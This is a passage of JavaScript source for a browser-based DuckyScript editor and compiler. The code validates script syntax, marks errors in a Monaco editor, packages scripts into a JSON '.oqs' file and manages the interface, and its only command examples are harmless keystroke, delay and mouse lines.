            if (!trimmed) continue;

            // Handle comment blocks
            if (trimmed.startsWith('REM_BLOCK') || trimmed.startsWith('/*')) {
                inCommentBlock = true;
                continue;
            }

            if ((trimmed.startsWith('END_REM') || trimmed.startsWith('*/')) && inCommentBlock) {
                inCommentBlock = false;
                continue;
            }

            if (inCommentBlock) continue;

            // Skip single line comments
            if (trimmed.startsWith('REM ') || trimmed.startsWith('//')) {
                continue;
            }

            // Handle string blocks
            if (trimmed === 'STRING_BLOCK') {
                inStringBlock = true;
                stringBlockType = 'STRING';
                continue;
            }

            if (trimmed === 'STRINGLN_BLOCK') {
                inStringBlock = true;
                stringBlockType = 'STRINGLN';
                continue;
            }

            if (trimmed === 'END_STRING' && inStringBlock && stringBlockType === 'STRING') {
                inStringBlock = false;
                stringBlockType = '';
                continue;
            }

            if (trimmed === 'END_STRINGLN' && inStringBlock && stringBlockType === 'STRINGLN') {
                inStringBlock = false;
                stringBlockType = '';
                continue;
            }

            if (inStringBlock) continue;

            // Parse commands
            const parts = trimmed.split(/\s+/);
            const command = parts[0].toUpperCase();

            // Validate known commands
            if (!this.duckyCommands.includes(command) && 
                !command.startsWith('$') && 
                !functions.has(command) &&
                !defines.has(command)) {

                errors.push({
                    line: lineNumber,
                    column: 1,
                    message: `Unknown command: ${command}`,
                    severity: 'error'
                });
                continue;
            }

            // Track structure
            if (command === 'FUNCTION') {
                functionDepth++;
                if (parts.length < 2) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'FUNCTION requires a function name',
                        severity: 'error'
                    });
                } else {
                    functions.add(parts[1]);
                }
            } else if (command === 'END_FUNCTION') {
                functionDepth--;
                if (functionDepth < 0) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'END_FUNCTION without matching FUNCTION',
                        severity: 'error'
                    });
                }
            } else if (command === 'IF') {
                ifDepth++;
                if (parts.length < 2) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'IF requires a condition',
                        severity: 'error'
                    });
                }
            } else if (command === 'END_IF') {
                ifDepth--;
                if (ifDepth < 0) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'END_IF without matching IF',
                        severity: 'error'
                    });
                }
            } else if (command === 'WHILE') {
                whileDepth++;
                if (parts.length < 2) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'WHILE requires a condition',
                        severity: 'error'
                    });
                }
            } else if (command === 'END_WHILE') {
                whileDepth--;
                if (whileDepth < 0) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'END_WHILE without matching WHILE',
                        severity: 'error'
                    });
                }
            } else if (command === 'VAR') {
                if (parts.length < 4 || parts[2] !== '=') {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'VAR syntax: VAR $name = value',
                        severity: 'error'
                    });
                } else if (!parts[1].startsWith('$')) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'Variable names must start with $',
                        severity: 'error'
                    });
                } else {
                    variables.add(parts[1]);
                }
            } else if (command === 'DEFINE') {
                if (parts.length < 3) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'DEFINE syntax: DEFINE NAME value',
                        severity: 'error'
                    });
                } else {
                    defines.add(parts[1]);
                }
            } else if (command === 'DELAY') {
                if (parts.length < 2) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'DELAY requires a value',
                        severity: 'error'
                    });
                } else if (!parts[1].startsWith('$') && isNaN(parseInt(parts[1]))) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'DELAY value must be numeric or a variable',
                        severity: 'error'
                    });
                }
            } else if (command === 'MOUSE_CLICK' || command === 'MOUSE_PRESS' || command === 'MOUSE_RELEASE') {
                if (parts.length < 2) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: `${command} requires a button (LEFT, RIGHT, MIDDLE)`,
                        severity: 'error'
                    });
                } else if (!this.mouseButtons.includes(parts[1].toUpperCase())) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: `Invalid mouse button: ${parts[1]}. Use LEFT, RIGHT, or MIDDLE`,
                        severity: 'error'
                    });
                }
            } else if (command === 'MOUSE_MOVE') {
                if (parts.length < 3) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'MOUSE_MOVE requires X and Y coordinates',
                        severity: 'error'
                    });
                } else if (isNaN(parseInt(parts[1])) || isNaN(parseInt(parts[2]))) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'MOUSE_MOVE coordinates must be numeric',
                        severity: 'error'
                    });
                }
            } else if (command === 'SELECT_LAYOUT') {
                if (parts.length < 2) {
                    errors.push({
                        line: lineNumber,
                        column: 1,
                        message: 'SELECT_LAYOUT requires a layout name',
                        severity: 'error'
                    });
                } else if (!this.layouts.includes(parts[1].toUpperCase())) {
                    warnings.push({
                        line: lineNumber,
                        column: 1,
                        message: `Unknown layout: ${parts[1]}. Supported layouts: ${this.layouts.join(', ')}`,
                        severity: 'warning'
                    });
                }
            }
        }

        // Check for unclosed blocks
        if (functionDepth > 0) {
            errors.push({
                line: lineNumber,
                column: 1,
                message: `${functionDepth} unclosed FUNCTION block(s)`,
                severity: 'error'
            });
        }

        if (ifDepth > 0) {
            errors.push({
                line: lineNumber,
                column: 1,
                message: `${ifDepth} unclosed IF block(s)`,
                severity: 'error'
            });
        }

        if (whileDepth > 0) {
            errors.push({
                line: lineNumber,
                column: 1,
                message: `${whileDepth} unclosed WHILE block(s)`,
                severity: 'error'
            });
        }

        if (inStringBlock) {
            errors.push({
                line: lineNumber,
                column: 1,
                message: `Unclosed ${stringBlockType}_BLOCK`,
                severity: 'error'
            });
        }

        if (inCommentBlock) {
            warnings.push({
                line: lineNumber,
                column: 1,
                message: 'Unclosed comment block',
                severity: 'warning'
            });
        }

        // Log validation results
        this.logMessage('info', `Validation completed - Lines: ${lineNumber}, Variables: ${variables.size}, Functions: ${functions.size}`);

        if (errors.length > 0) {
            this.logMessage('error', `Found ${errors.length} error(s):`);
            errors.forEach(error => {
                this.logMessage('error', `  Line ${error.line}: ${error.message}`);
            });
        }

        if (warnings.length > 0) {
            this.logMessage('warning', `Found ${warnings.length} warning(s):`);
            warnings.forEach(warning => {
                this.logMessage('warning', `  Line ${warning.line}: ${warning.message}`);
            });
        }

        if (errors.length === 0 && warnings.length === 0) {
            this.logMessage('success', 'Script validation passed with no issues!');
        }

        // Update editor markers
        this.updateEditorMarkers(errors, warnings);

        return {
            isValid: errors.length === 0,
            errors,
            warnings,
            stats: {
                lines: lineNumber,
                variables: variables.size,
                functions: functions.size
            }
        };
    }

    /**
     * Update editor markers for errors and warnings
     */
    updateEditorMarkers(errors, warnings) {
        if (!this.editor) return;

        const markers = [];

        errors.forEach(error => {
            markers.push({
                startLineNumber: error.line,
                startColumn: error.column,
                endLineNumber: error.line,
                endColumn: error.column + 10,
                message: error.message,
                severity: monaco.MarkerSeverity.Error
            });
        });

        warnings.forEach(warning => {
            markers.push({
                startLineNumber: warning.line,
                startColumn: warning.column,
                endLineNumber: warning.line,
                endColumn: warning.column + 10,
                message: warning.message,
                severity: monaco.MarkerSeverity.Warning
            });
        });

        monaco.editor.setModelMarkers(this.editor.getModel(), 'duckyscript', markers);
    }

    /**
     * Generate .oqs payload
     */
    async generatePayload(content) {
        // Clean and process the content
        const lines = content.split('\n').map(line => line.trim()).filter(line => line);

        // Count various elements
        let commands = 0;
        let variables = 0;
        let functions = 0;

        const processedLines = [];

        for (const line of lines) {
            if (line.startsWith('REM') || line.startsWith('//')) continue;
            if (line === '') continue;

            processedLines.push(line);
            commands++;

            if (line.startsWith('VAR ')) variables++;
            if (line.startsWith('FUNCTION ')) functions++;
        }

        // Create payload metadata
        const metadata = {
            version: "2.0",
            generated: new Date().toISOString(),
            compiler: "WiFi Ducky Enhanced Compiler",
            author: "NikhilMunda",
            project: "OverQuack",
            stats: {
                totalLines: lines.length,
                commands,
                variables,
                functions
            }
        };

        // Generate final payload
        const payload = {
            metadata,
            script: processedLines.join('\n')
        };

        const payloadString = JSON.stringify(payload, null, 2);

        return {
            content: payloadString,
            size: payloadString.length,
            commands,
            variables,
            functions
        };
    }

    /**
     * Download payload file
     */
    downloadPayload() {
        if (!this.compiledPayload) {
            this.showToast('error', 'No Payload', 'Please compile the script first.');
            return;
        }

        const filename = `wifi_ducky_payload_${Date.now()}.oqs`;
        this.downloadFile(this.compiledPayload.content, filename, 'application/json');

        this.logMessage('success', `Payload downloaded: ${filename}`);
        this.showToast('success', 'Download Complete', `Downloaded ${filename}`);
    }

    /**
     * Download file helper
     */
    downloadFile(content, filename, mimeType) {
        const blob = new Blob([content], { type: mimeType });
        const url = URL.createObjectURL(blob);

        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        URL.revokeObjectURL(url);
    }

    /**
     * Clear console
     */
    clearConsole() {
        this.consoleMessages = [];
        const consoleOutput = document.getElementById('console-output');
        if (consoleOutput) {
            consoleOutput.innerHTML = '';
        }
    }

    /**
     * Log message to console
     */
    logMessage(type, message) {
        const timestamp = new Date().toLocaleTimeString();
        const consoleMessage = {
            type,
            message,
            timestamp
        };

        this.consoleMessages.push(consoleMessage);

        const consoleOutput = document.getElementById('console-output');
        if (consoleOutput) {
            const messageElement = document.createElement('div');
            messageElement.className = `console-message ${type}`;
            messageElement.innerHTML = `
                <span class="console-timestamp">[${timestamp}]</span>
                ${this.escapeHtml(message)}
            `;

            consoleOutput.appendChild(messageElement);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }
    }

    /**
     * Escape HTML
     */
    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    /**
     * Update statistics
     */
    updateStats() {
        if (!this.editor) return;

        const content = this.editor.getValue();
        const lines = content.split('\n').filter(line => line.trim());

        // Count variables and functions
        let variables = 0;
        let functions = 0;

        lines.forEach(line => {
            const trimmed = line.trim();
            if (trimmed.startsWith('VAR ')) variables++;
            if (trimmed.startsWith('FUNCTION ')) functions++;
        });

        this.stats = {
            lines: lines.length,
            variables,
            functions,
            memoryUsage: Math.min(95, Math.floor(content.length / 1000)) // Simulate memory usage
        };

        // Update UI
        document.getElementById('line-count').textContent = this.stats.lines;
        document.getElementById('var-count').textContent = this.stats.variables;
        document.getElementById('func-count').textContent = this.stats.functions;
        document.getElementById('memory-usage').textContent = `${this.stats.memoryUsage}%`;
    }

    /**
     * Update cursor position
     */
    updateCursorPosition() {
        if (!this.editor) return;

        const position = this.editor.getPosition();
        if (position) {
            document.getElementById('cursor-position').textContent = 
                `Line ${position.lineNumber}, Column ${position.column}`;
        }
    }

    /**
     * Update selection info
     */
    updateSelectionInfo() {
        if (!this.editor) return;

        const selection = this.editor.getSelection();
        if (selection && !selection.isEmpty()) {
            const selectedText = this.editor.getModel().getValueInRange(selection);
            const lines = selectedText.split('\n').length;
            const chars = selectedText.length;

            document.getElementById('selection-info').textContent = 
                `${lines} line${lines !== 1 ? 's' : ''}, ${chars} char${chars !== 1 ? 's' : ''} selected`;
        } else {
            document.getElementById('selection-info').textContent = 'No selection';
        }
    }

    /**
     * Toggle theme
     */
    toggleTheme() {
        this.currentTheme = this.currentTheme === 'light' ? 'dark' : 'light';
        this.applyTheme(this.currentTheme);
        localStorage.setItem('ducky-theme', this.currentTheme);
    }

    /**
     * Apply theme
     */
    applyTheme(theme) {
        document.body.setAttribute('data-theme', theme);

        const themeIcon = document.querySelector('.theme-icon');
        if (themeIcon) {
            themeIcon.textContent = theme === 'light' ? '🌙' : '☀️';
        }

        if (this.editor) {
            monaco.editor.setTheme(theme === 'dark' ? 'vs-dark' : 'vs');
        }
    }

    /**
     * Show/hide progress indicator
     */
    showProgress(show) {
        const progressContainer = document.getElementById('progress-container');
        if (progressContainer) {
            progressContainer.style.display = show ? 'block' : 'none';
        }
    }

    /**
     * Update progress bar
     */
    updateProgress(percent) {
        const progressBar = document.getElementById('progress-bar');
        if (progressBar) {
            progressBar.style.width = `${percent}%`;
        }
    }

    /**
     * Update compile button state
     */
    updateCompileButton(isCompiling) {
        const compileBtn = document.getElementById('compile-btn');
        if (compileBtn) {
            compileBtn.disabled = isCompiling;
            compileBtn.classList.toggle('loading', isCompiling);
            compileBtn.querySelector('span').textContent = isCompiling ? '⏳' : '⚙️';
        }
    }

    /**
     * Show toast notification
     */
    showToast(type, title, message) {
        const toastContainer = document.getElementById('toast-container');
        if (!toastContainer) return;

        const toast = document.createElement('div');
        toast.className = `toast ${type}`;

        const icons = {
            success: '✅',
            error: '❌',
            warning: '⚠️',
            info: 'ℹ️'
        };

        toast.innerHTML = `
            <div class="toast-icon">${icons[type] || 'ℹ️'}</div>
            <div class="toast-content">
                <div class="toast-title">${title}</div>
                <div class="toast-message">${message}</div>
            </div>
            <button class="toast-close">✕</button>
        `;

        // Add close functionality
        toast.querySelector('.toast-close').addEventListener('click', () => {
            toast.remove();
        });

        toastContainer.appendChild(toast);

        // Show toast
        setTimeout(() => toast.classList.add('show'), 100);

        // Auto remove after 5 seconds
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 5000);
    }

    /**
     * Populate templates
     */
    populateTemplates() {
        const templateList = document.getElementById('template-list');
        if (!templateList) return;

        templateList.innerHTML = '';

        this.templates.forEach(template => {
            const templateElement = document.createElement('div');
            templateElement.className = 'template-item';
            templateElement.innerHTML = `
                <div class="template-name">${template.name}</div>
                <div class="template-description">${template.description}</div>
                <div class="template-preview">${template.code.substring(0, 200)}...</div>
            `;

            templateElement.addEventListener('click', () => {
                this.loadTemplate(template);
                this.closeModal(document.getElementById('templates-modal'));
            });

            templateList.appendChild(templateElement);
        });
    }

    /**
     * Load template into editor
     */
    loadTemplate(template) {
        if (this.editor) {
            this.editor.setValue(template.code);
            this.logMessage('info', `Template loaded: ${template.name}`);
            this.showToast('success', 'Template Loaded', template.name);
        }
    }

    /**
     * Populate documentation
     */
    populateDocumentation() {
        const docsList = document.getElementById('docs-list');
        if (!docsList) return;

        docsList.innerHTML = '';

        this.duckyCommands.forEach(command => {
            const docElement = document.createElement('div');
            docElement.className = 'docs-command';
            docElement.innerHTML = `
                <div class="docs-command-name">${command}</div>
                <div class="docs-command-description">${this.getCommandDocumentation(command)}</div>
                <div class="docs-command-example">${this.getCommandExample(command)}</div>
            `;

            docsList.appendChild(docElement);
        });
    }

    /**
     * Get command example
     */
    getCommandExample(command) {
        const examples = {
            'STRING': 'STRING Hello World!',
            'STRINGLN': 'STRINGLN This adds a newline',
            'DELAY': 'DELAY 1000',
            'VAR': 'VAR $myvar = "test"',
            'FUNCTION': 'FUNCTION my_function\n    STRING test\nEND_FUNCTION',
            'IF': 'IF $var > 5\n    STRING Greater than 5\nEND_IF',
            'WHILE': 'WHILE $counter > 0\n    STRING $counter\n    $counter = $counter - 1\nEND_WHILE',
            'MOUSE_CLICK': 'MOUSE_CLICK LEFT',
            'MOUSE_MOVE': 'MOUSE_MOVE 100 50'
        };

        return examples[command] || `${command} (example not available)`;
    }

    /**
     * Show modal
     */
    showModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.add('active');
        }
    }

    /**
     * Close modal
     */
    closeModal(modal) {
        if (modal) {
            modal.classList.remove('active');
        }
    }

    /**
     * Show templates modal
     */
    showTemplates() {
        this.showModal('templates-modal');
    }

    /**
     * Show help modal
     */
    showHelp() {
        this.showModal('help-modal');
    }

    /**
     * Show settings modal
     */
    showSettings() {
        this.showModal('settings-modal');

        // Load current settings
        document.getElementById('auto-save').checked = this.autoSave;
        document.getElementById('auto-compile').checked = this.autoCompile;
        document.getElementById('strict-validation').checked = this.strictValidation;
    }

    /**
     * Switch tab
     */
    switchTab(tabName) {
        // Update tab buttons
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.classList.remove('active');
            btn.setAttribute('aria-selected', 'false');
        });

        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
        document.querySelector(`[data-tab="${tabName}"]`).setAttribute('aria-selected', 'true');

        // Update tab content
        document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.remove('active');
        });

        document.getElementById(`${tabName}-tab`).classList.add('active');
    }

    /**
     * Toggle fullscreen
     */
    toggleFullscreen() {
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
                this.showToast('error', 'Fullscreen Error', 'Could not enter fullscreen mode');
            });
        } else {
            document.exitFullscreen();
        }
    }

    /**
     * Show find and replace
     */
    showFindReplace() {
        if (this.editor) {
            this.editor.trigger('', 'actions.find');
        }
    }

    /**
     * Format code
     */
    formatCode() {
        if (this.editor) {
            this.editor.trigger('', 'editor.action.formatDocument');
            this.showToast('success', 'Code Formatted', 'Script has been formatted');
        }
    }

    /**
     * Toggle word wrap
     */
    toggleWordWrap() {
        if (this.editor) {
            const currentWrap = this.editor.getOption(monaco.editor.EditorOption.wordWrap);
            const newWrap = currentWrap === 'off' ? 'on' : 'off';
            this.editor.updateOptions({ wordWrap: newWrap });

            const btn = document.getElementById('word-wrap-btn');
            btn.style.opacity = newWrap === 'on' ? '1' : '0.6';
        }
    }

    /**
     * Toggle minimap
     */
    toggleMinimap() {
        if (this.editor) {
            const currentMinimap = this.editor.getOption(monaco.editor.EditorOption.minimap);
            const newMinimap = { enabled: !currentMinimap.enabled };
            this.editor.updateOptions({ minimap: newMinimap });

            const btn = document.getElementById('minimap-btn');
            btn.style.opacity = newMinimap.enabled ? '1' : '0.6';
        }
    }

    /**
     * Update layout selection
     */
    updateLayoutSelection(layout) {
        this.logMessage('info', `Layout changed to: ${layout}`);
    }

    /**
     * Save to localStorage
     */
    saveToLocalStorage() {
        if (this.editor) {
            localStorage.setItem('ducky-script-content', this.editor.getValue());
        }
    }

    /**
     * Load from localStorage
     */
    loadFromLocalStorage() {
        const saved = localStorage.getItem('ducky-script-content');
        if (saved && this.editor) {
            this.editor.setValue(saved);
        }
    }

    /**
     * Debounced validation for auto-compile
     */
    debounceValidation() {
        clearTimeout(this.validationTimeout);
        this.validationTimeout = setTimeout(() => {
            this.validateScript();
        }, 1000);
    }
}

// Initialize the application when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    window.wifiDuckyCompiler = new WiFiDuckyCompiler();
});

// Handle page unload
window.addEventListener('beforeunload', (e) => {
    if (window.wifiDuckyCompiler && window.wifiDuckyCompiler.autoSave) {
        window.wifiDuckyCompiler.saveToLocalStorage();
    }
});